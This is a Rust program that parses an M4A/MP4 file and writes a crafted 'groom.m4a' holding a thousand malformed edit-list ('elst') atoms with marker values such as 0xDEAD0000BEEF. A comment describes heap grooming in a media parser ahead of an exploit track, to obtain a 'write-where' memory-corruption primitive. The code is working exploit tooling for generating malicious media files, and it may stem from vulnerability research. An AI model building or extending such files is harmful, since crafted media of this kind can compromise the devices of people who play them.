
fn take<const COUNT: usize>(i: &[u8]) -> (&[u8], [u8; COUNT]) {
    (&i[COUNT..], i[..COUNT].try_into().unwrap())
}

fn taken(i: &[u8], size: usize) -> (&[u8], &[u8]) {
    (&i[size..], &i[..size])
}

fn be_u32(i: &[u8]) -> (&[u8], u32) {
    let (i, x) = take::<4>(i);
    (i, u32::from_be_bytes(x))
}

fn be_i32(i: &[u8]) -> (&[u8], i32) {
    let (i, x) = take::<4>(i);
    (i, i32::from_be_bytes(x))
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub struct Kind([u8; 4]);

impl core::fmt::Debug for Kind {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        write!(f, "Kind(\"")?;
        for i in 0..4 {
            write!(f, "{}", char::from_u32(self.0[i] as u32).unwrap())?;
        }
        write!(f, "\")")
    }
}

#[derive(Debug, Copy, Clone)]
struct AtomHead {
    length: i32,
    ident: Kind,
    extended_length: Option<u64>,
}
impl AtomHead {
    fn read(i: &[u8]) -> (&[u8], Self) {
        let (i, length) = be_i32(i);
        let (i, ident) = take::<4>(i);
        assert_ne!(length, 1);

        (i, Self {
            length,
            ident: Kind(ident),
            extended_length: None,
        })
    }

    fn write(&self, out: &mut Vec<u8>) {
        assert_eq!(self.extended_length, None);

        out.extend_from_slice(&self.length.to_be_bytes());
        out.extend_from_slice(&self.ident.0);
    }

    fn content_len(&self) -> Option<i32> {
        if self.length == 0 {
            return None;
        }
        assert_eq!(self.extended_length, None);
        Some(self.length - 8)
    }
}

pub enum Atom {
    Child(Kind, Vec<Atom>),
    Data(Kind, Vec<u8>),
}

impl Atom {
    fn write(&self, out: &mut Vec<u8>) {
        match self {
            Atom::Child(kind, child) => {
                let mut body = Vec::new();
                for c in child {
                    c.write(&mut body);
                }

                AtomHead {
                    ident: *kind,
                    extended_length: None,
                    length: body.len() as i32 + 8,
                }.write(out);
                out.extend_from_slice(&body);
            }

            Atom::Data(kind, body) => {
                AtomHead {
                    ident: *kind,
                    extended_length: None,
                    length: body.len() as i32 + 8,
                }.write(out);
                out.extend_from_slice(&body);
            }
        }
    }
}

fn parse_body(mut i: &[u8]) -> Vec<(AtomHead, Vec<u8>)> {
    if i.is_empty() {
        return Vec::new();
    }

    let mut out = Vec::new();
    loop {
        let (j, atom) = AtomHead::read(i);

        let (j, body) = taken(j, atom.content_len().unwrap_or(j.len() as i32).min(j.len() as i32) as usize);

        out.push((atom, body.to_vec()));

        if j.is_empty() {
            break;
        }

        i = j;
    }
    out
}

fn main() {
    //let file = std::fs::read("./tmp.m4a").unwrap();
    let file = std::fs::read("./out.m4a").unwrap();

    let mut in_atom = Vec::new();
    fn print_file(d: &[u8], i: u8, in_atom: &mut Vec<(AtomHead, Vec<u8>)>) {
        let pad = (0..i).map(|_| "- ").collect::<String>();
        let out = parse_body(&d);
        for (atom, body) in out {
           println!("{}Atom: {:?}", pad, atom);

            let nest = [
                Kind(*b"moov"),
                Kind(*b"trak"),
                Kind(*b"mdia"),
                Kind(*b"minf"),
                Kind(*b"stbl"),
                Kind(*b"edts"),
            ];

            in_atom.push((atom.clone(), body.clone()));

            if nest.contains(&atom.ident)  {
                print_file( &body, i+1, in_atom);
            }
        }
    }

    print_file(&file, 0, &mut in_atom);

    let mvhd = in_atom.iter().find(|f| f.0.ident == Kind(*b"mvhd")).unwrap();
    let tkhd = in_atom.iter().find(|f| f.0.ident == Kind(*b"tkhd")).unwrap();
    let mdhd = in_atom.iter().find(|f| f.0.ident == Kind(*b"mdhd")).unwrap();
    let hdlr = in_atom.iter().find(|f| f.0.ident == Kind(*b"hdlr")).unwrap();
    let dinf = in_atom.iter().find(|f| f.0.ident == Kind(*b"dinf")).unwrap();

    let dinf = in_atom.iter().find(|f| f.0.ident == Kind(*b"dinf")).unwrap();
    let stsd = in_atom.iter().find(|f| f.0.ident == Kind(*b"stsd")).unwrap();
    let stts = in_atom.iter().find(|f| f.0.ident == Kind(*b"stts")).unwrap();
    let stsc = in_atom.iter().find(|f| f.0.ident == Kind(*b"stsc")).unwrap();
    let stsz = in_atom.iter().find(|f| f.0.ident == Kind(*b"stsz")).unwrap();
    let stco = in_atom.iter().find(|f| f.0.ident == Kind(*b"stco")).unwrap();

    let single_item_elst_data = {
        let mut d = Vec::new();

        // Version
        d.extend_from_slice(0x01010101u32.to_be_bytes().as_slice());
        // Count
        let count: u32 = 1;
        d.extend_from_slice(count.to_be_bytes().as_slice());

        for _ in 0..count {
            d.extend_from_slice(0xDEAD0000BEEFu64.to_be_bytes().as_slice());
            d.extend_from_slice(0u64.to_be_bytes().as_slice());
            d.extend_from_slice(0xF00DBABEu32.to_be_bytes().as_slice());
        }

        d
    };

    let elst_data = {
        let mut d = Vec::new();

        // Version
        d.extend_from_slice(0x01010101u32.to_be_bytes().as_slice());
        // Count
        // let heap_size: u32 = 1024*1024 + 1024*512;
        // let alloc_count = heap_size / 0x24;
        //let count: u32 = 30000;// 43690;
        let count: u32 = 1;// 43690;
        d.extend_from_slice(count.to_be_bytes().as_slice());

        for _ in 0..count {
            d.extend_from_slice(0xDEAD0000BEEFu64.to_be_bytes().as_slice());
            d.extend_from_slice(0u64.to_be_bytes().as_slice());
            d.extend_from_slice(0xF00DBABEu32.to_be_bytes().as_slice());
        }

        // padding
        d.extend_from_slice(1u64.to_be_bytes().as_slice());

        d
    };

    //tODO: 
    // Old idea:
    // Then use big elst file to clear out heap into a clean state with few chunks (groom-to-reset)
    // playlist with groom-clear track + exploit track
    // New idea:
    // Clearing out the heap will get rid of freelist, this is bad
    // Instead we will create a *lot* of valid chunks for our groom, this should almost guarentee that we land next to a heap chunk
    // plan:
    // reset heap state
    // run exploit to do a write-where
    // hopefully there are some pointers that end up in fixed places (due to reset might be likely?)
    let mut edts_body = Vec::new();
    for _ in 0..1000 {
        edts_body.push(Atom::Data(Kind(*b"elst"), single_item_elst_data.clone()));
    }
    let root = Atom::Child(Kind(*b"moov"), vec![
        Atom::Data(Kind(*b"mvhd"), mvhd.1.to_vec()),
        Atom::Child(Kind(*b"trak"), vec![
            Atom::Data(Kind(*b"tkhd"), tkhd.1.to_vec()),
            // Mandatory
            Atom::Child(Kind(*b"mdia"), vec![
                // Mandatory
                Atom::Data(Kind(*b"mdhd"), mdhd.1.to_vec()),
                // Mandatory
                Atom::Data(Kind(*b"hdlr"), hdlr.1.to_vec()),
                // Mandatory
                Atom::Child(Kind(*b"minf"), vec![
                    // Mandatory
                    Atom::Data(Kind(*b"dinf"), dinf.1.to_vec()),
                    // Mandatory
                    Atom::Child(Kind(*b"stbl"), vec![
                        Atom::Data(Kind(*b"stsd"), stsd.1.to_vec()),
                        Atom::Data(Kind(*b"stts"), stts.1.to_vec()),
                        Atom::Data(Kind(*b"stsc"), stsc.1.to_vec()),
                        Atom::Data(Kind(*b"stsz"), stsz.1.to_vec()),
                        Atom::Data(Kind(*b"stco"), stco.1.to_vec()),
                    ]),

                ]),
            ]),
            Atom::Child(Kind(*b"edts"), edts_body),
        ]),
    ]);
    let mut out = Vec::new();
    root.write(&mut out);
    let mut ig = Vec::new();
    print_file(&out, 0, &mut ig);
    std::fs::write("./groom.m4a", &out).unwrap();
}
